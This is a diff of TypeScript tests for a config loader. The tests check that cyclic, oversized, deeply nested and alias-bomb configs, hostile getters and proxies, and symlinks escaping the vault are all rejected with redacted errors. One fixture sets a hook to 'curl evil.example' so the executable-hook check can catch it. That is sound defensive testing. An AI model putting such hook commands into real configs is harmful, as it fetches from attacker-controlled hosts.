@@ -13,8 +13,12 @@ import {
   ConfigError,
   DEFAULT_CONTEXT_BUDGET_TOKENS,
   loadConfig,
+  MAX_CONFIG_BYTES,
   nodeConfigFs,
+  parseLocalConfig,
+  parsePortableConfig,
   type BridgeConfig,
+  type ConfigFs,
 } from "../../src/config.js";
 import type { HostId } from "../../src/types.js";
 import {
@@ -62,6 +66,34 @@ async function writeLocalConfig(ctx: TestContext, value: unknown): Promise<strin
 
 function load(ctx: TestContext): Promise<BridgeConfig> {
   return loadConfig({ xdgConfigHome: ctx.xdg, home: ctx.home, fs: nodeConfigFs });
+}
+
+/** Build a Node-style error with a stable `code`, echoing only a fake path. */
+function nodeError(code: string, filePath: string): NodeJS.ErrnoException {
+  const error = new Error(`${code}: ${filePath}`) as NodeJS.ErrnoException;
+  error.code = code;
+  return error;
+}
+
+/** Wrap the node fs seam, failing calls that match `failWhen`. */
+function failingConfigFs(
+  failWhen: (method: "readFile" | "stat" | "realpath", filePath: string) => boolean,
+  code: string,
+): ConfigFs {
+  return {
+    readFile: async (filePath) => {
+      if (failWhen("readFile", filePath)) throw nodeError(code, filePath);
+      return nodeConfigFs.readFile(filePath);
+    },
+    stat: async (filePath) => {
+      if (failWhen("stat", filePath)) throw nodeError(code, filePath);
+      return nodeConfigFs.stat(filePath);
+    },
+    realpath: async (filePath) => {
+      if (failWhen("realpath", filePath)) throw nodeError(code, filePath);
+      return nodeConfigFs.realpath(filePath);
+    },
+  };
 }
 
 function validLocalConfig(): Record<string, unknown> {
@@ -1023,6 +1055,372 @@ secret_note: "private-vault-name"
       const message = (caught as ConfigError).message;
       expect(message).not.toContain("private-vault-name");
       expect(JSON.stringify(caught)).not.toContain("private-vault-name");
+    });
+  });
+});
+
+describe("loadConfig: cyclic, hostile, and adversarial configs", () => {
+  it("rejects a cyclic YAML document through loadConfig with a fixed redacted error", async () => {
+    await withVault(async (ctx) => {
+      const portable = `version: 1
+layout:
+  daily_dir: "Notas Diarias"
+  projects_dir: "Proyectos"
+  inbox_dir: "Inbox"
+  templates_dir: "_plantillas"
+loop: &loop
+  child: *loop
+`;
+      await ctx.vault.writePortableConfig(portable);
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      const err = caught as ConfigError;
+      expect(err.code).toBe("portable_config_invalid");
+      expect(err.message).not.toContain("loop");
+      expect(JSON.stringify(caught)).not.toContain("loop");
+    });
+  });
+
+  it("rejects a cyclic unknown object through parsePortableConfig", () => {
+    const cyclic: Record<string, unknown> = {};
+    cyclic.self = cyclic;
+    let caught: unknown;
+    try {
+      parsePortableConfig(cyclic);
+    } catch (error) {
+      caught = error;
+    }
+    expect(caught).toBeInstanceOf(ConfigError);
+    expect((caught as ConfigError).code).toBe("portable_config_invalid");
+    expect(JSON.stringify(caught)).not.toContain("self");
+  });
+
+  it("rejects a cyclic unknown object through parseLocalConfig", () => {
+    const cyclic: Array<unknown> = [];
+    cyclic.push(cyclic);
+    let caught: unknown;
+    try {
+      parseLocalConfig(cyclic);
+    } catch (error) {
+      caught = error;
+    }
+    expect(caught).toBeInstanceOf(ConfigError);
+    expect((caught as ConfigError).code).toBe("local_config_invalid");
+  });
+
+  it("rejects cyclic documents that also carry secret-shaped keys as invalid, not secrets", () => {
+    // A cycle encountered before a later secret must be rejected as invalid
+    // rather than classified; only bounded, acyclic trees may be classified.
+    const cyclic: Record<string, unknown> = {};
+    cyclic.child = cyclic;
+    cyclic.password = "hunter2";
+    let caught: unknown;
+    try {
+      parsePortableConfig(cyclic);
+    } catch (error) {
+      caught = error;
+    }
+    expect(caught).toBeInstanceOf(ConfigError);
+    expect((caught as ConfigError).code).toBe("portable_config_invalid");
+    expect((caught as ConfigError).message).not.toContain("hunter2");
+  });
+
+  it("rejects deeply nested config trees through both public parsers", () => {
+    let nested: unknown = [];
+    for (let i = 0; i < 200; i += 1) {
+      nested = [nested];
+    }
+    let portableCaught: unknown;
+    try {
+      parsePortableConfig(nested);
+    } catch (error) {
+      portableCaught = error;
+    }
+    expect(portableCaught).toBeInstanceOf(ConfigError);
+    expect((portableCaught as ConfigError).code).toBe("portable_config_invalid");
+
+    let localCaught: unknown;
+    try {
+      parseLocalConfig(nested);
+    } catch (error) {
+      localCaught = error;
+    }
+    expect(localCaught).toBeInstanceOf(ConfigError);
+    expect((localCaught as ConfigError).code).toBe("local_config_invalid");
+  });
+
+  it("rejects config trees that exceed the node budget through both public parsers", () => {
+    const wide: Record<string, unknown> = {};
+    for (let i = 0; i < 10_100; i += 1) {
+      wide[`key${i}`] = i;
+    }
+    let portableCaught: unknown;
+    try {
+      parsePortableConfig(wide);
+    } catch (error) {
+      portableCaught = error;
+    }
+    expect(portableCaught).toBeInstanceOf(ConfigError);
+    expect((portableCaught as ConfigError).code).toBe("portable_config_invalid");
+
+    let localCaught: unknown;
+    try {
+      parseLocalConfig(wide);
+    } catch (error) {
+      localCaught = error;
+    }
+    expect(localCaught).toBeInstanceOf(ConfigError);
+    expect((localCaught as ConfigError).code).toBe("local_config_invalid");
+  });
+
+  it("rejects oversized local JSON files through loadConfig", async () => {
+    await withVault(async (ctx) => {
+      await writeFile(ctx.localConfigFile, "x".repeat(MAX_CONFIG_BYTES + 1), "utf8");
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("local_config_invalid");
+    });
+  });
+
+  it("rejects oversized portable YAML files through loadConfig", async () => {
+    await withVault(async (ctx) => {
+      await ctx.vault.writePortableConfig("x".repeat(MAX_CONFIG_BYTES + 1));
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("portable_config_invalid");
+    });
+  });
+
+  it("rejects YAML documents whose alias expansion exceeds the alias budget", async () => {
+    await withVault(async (ctx) => {
+      let portable = `version: 1
+layout:
+  daily_dir: "Notas Diarias"
+  projects_dir: "Proyectos"
+  inbox_dir: "Inbox"
+  templates_dir: "_plantillas"
+base: &base 1
+`;
+      for (let i = 0; i < 150; i += 1) {
+        portable += `alias${i}: *base\n`;
+      }
+      await ctx.vault.writePortableConfig(portable);
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("portable_config_invalid");
+    });
+  });
+
+  it("turns hostile getters into the source-appropriate invalid error", () => {
+    const hostile: Record<string, unknown> = { version: 1 };
+    Object.defineProperty(hostile, "boom", {
+      enumerable: true,
+      get() {
+        throw new Error("raw getter trap");
+      },
+    });
+    let portableCaught: unknown;
+    try {
+      parsePortableConfig(hostile);
+    } catch (error) {
+      portableCaught = error;
+    }
+    expect(portableCaught).toBeInstanceOf(ConfigError);
+    expect((portableCaught as ConfigError).code).toBe("portable_config_invalid");
+    expect((portableCaught as ConfigError).message).not.toContain("raw getter trap");
+
+    let localCaught: unknown;
+    try {
+      parseLocalConfig(hostile);
+    } catch (error) {
+      localCaught = error;
+    }
+    expect(localCaught).toBeInstanceOf(ConfigError);
+    expect((localCaught as ConfigError).code).toBe("local_config_invalid");
+  });
+
+  it("turns hostile proxy traps into the source-appropriate invalid error", () => {
+    const proxy = new Proxy({ version: 1 }, {
+      ownKeys() {
+        throw new Error("raw proxy trap");
+      },
+    });
+    let caught: unknown;
+    try {
+      parsePortableConfig(proxy);
+    } catch (error) {
+      caught = error;
+    }
+    expect(caught).toBeInstanceOf(ConfigError);
+    expect((caught as ConfigError).code).toBe("portable_config_invalid");
+    expect((caught as ConfigError).message).not.toContain("raw proxy trap");
+    expect(JSON.stringify(caught)).not.toContain("raw proxy trap");
+  });
+
+  it("preserves secret and hook classification for a normal bounded tree", () => {
+    const bounded: Record<string, unknown> = {};
+    for (let i = 0; i < 500; i += 1) {
+      bounded[`key${i}`] = i;
+    }
+    bounded.token = "classified";
+    let caught: unknown;
+    try {
+      parsePortableConfig(bounded);
+    } catch (error) {
+      caught = error;
+    }
+    expect(caught).toBeInstanceOf(ConfigError);
+    expect((caught as ConfigError).code).toBe("secret_shaped_key");
+    expect((caught as ConfigError).message).not.toContain("classified");
+
+    const hookTree: Record<string, unknown> = {};
+    for (let i = 0; i < 500; i += 1) {
+      hookTree[`key${i}`] = i;
+    }
+    hookTree.script = "curl evil.example";
+    let hookCaught: unknown;
+    try {
+      parsePortableConfig(hookTree);
+    } catch (error) {
+      hookCaught = error;
+    }
+    expect(hookCaught).toBeInstanceOf(ConfigError);
+    expect((hookCaught as ConfigError).code).toBe("executable_hook");
+  });
+});
+
+describe("loadConfig: layout realpath containment", () => {
+  it("rejects a required layout directory that symlinks outside the vault", async () => {
+    await withVault(async (ctx) => {
+      const outsideDir = path.join(ctx.root, "outside-inbox");
+      await mkdir(outsideDir);
+      const { inboxDir } = ctx.vault.paths;
+      await rm(inboxDir, { recursive: true, force: true });
+      await ctx.vault.createSymlink("Inbox", outsideDir);
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      const err = caught as ConfigError;
+      expect(err.code).toBe("layout_escape");
+      expect(err.message).not.toContain("outside-inbox");
+      expect(JSON.stringify(caught)).not.toContain("outside-inbox");
+    });
+  });
+
+  it("allows a required layout directory that symlinks inside the vault", async () => {
+    await withVault(async (ctx) => {
+      const { inboxDir, projectsDir } = ctx.vault.paths;
+      await rm(inboxDir, { recursive: true, force: true });
+      await ctx.vault.createSymlink("Inbox", projectsDir);
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      const cfg = await load(ctx);
+      expect(cfg.layout.inbox_dir).toBe("Inbox");
+    });
+  });
+
+  it("maps EACCES on a layout realpath to the fixed layout_unreadable error", async () => {
+    await withVault(async (ctx) => {
+      const { inboxDir } = ctx.vault.paths;
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      const fs = failingConfigFs(
+        (method, filePath) => method === "realpath" && filePath === inboxDir,
+        "EACCES",
+      );
+      let caught: unknown;
+      try {
+        await loadConfig({ xdgConfigHome: ctx.xdg, home: ctx.home, fs });
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      const err = caught as ConfigError;
+      expect(err.code).toBe("layout_unreadable");
+      expect(err.message).not.toContain("Inbox");
+    });
+  });
+
+  it("maps EIO on a layout realpath to the fixed layout_unreadable error", async () => {
+    await withVault(async (ctx) => {
+      const { inboxDir } = ctx.vault.paths;
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      const fs = failingConfigFs(
+        (method, filePath) => method === "realpath" && filePath === inboxDir,
+        "EIO",
+      );
+      let caught: unknown;
+      try {
+        await loadConfig({ xdgConfigHome: ctx.xdg, home: ctx.home, fs });
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("layout_unreadable");
+    });
+  });
+
+  it("maps ENOENT on a layout realpath to layout_missing, not a raw error", async () => {
+    await withVault(async (ctx) => {
+      const { inboxDir } = ctx.vault.paths;
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      const fs = failingConfigFs(
+        (method, filePath) => method === "realpath" && filePath === inboxDir,
+        "ENOENT",
+      );
+      let caught: unknown;
+      try {
+        await loadConfig({ xdgConfigHome: ctx.xdg, home: ctx.home, fs });
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("layout_missing");
+    });
+  });
+
+  it("applies realpath containment to every required layout directory", async () => {
+    await withVault(async (ctx) => {
+      const outsideDir = path.join(ctx.root, "outside-projects");
+      await mkdir(outsideDir);
+      const { projectsDir } = ctx.vault.paths;
+      await rm(projectsDir, { recursive: true, force: true });
+      await ctx.vault.createSymlink("Proyectos", outsideDir);
+      await writeLocalConfig(ctx, { version: 1, host_id: "workstation", vault_path: ctx.vault.vaultPath });
+      let caught: unknown;
+      try {
+        await load(ctx);
+      } catch (error) {
+        caught = error;
+      }
+      expect(caught).toBeInstanceOf(ConfigError);
+      expect((caught as ConfigError).code).toBe("layout_escape");
     });
   });
 });
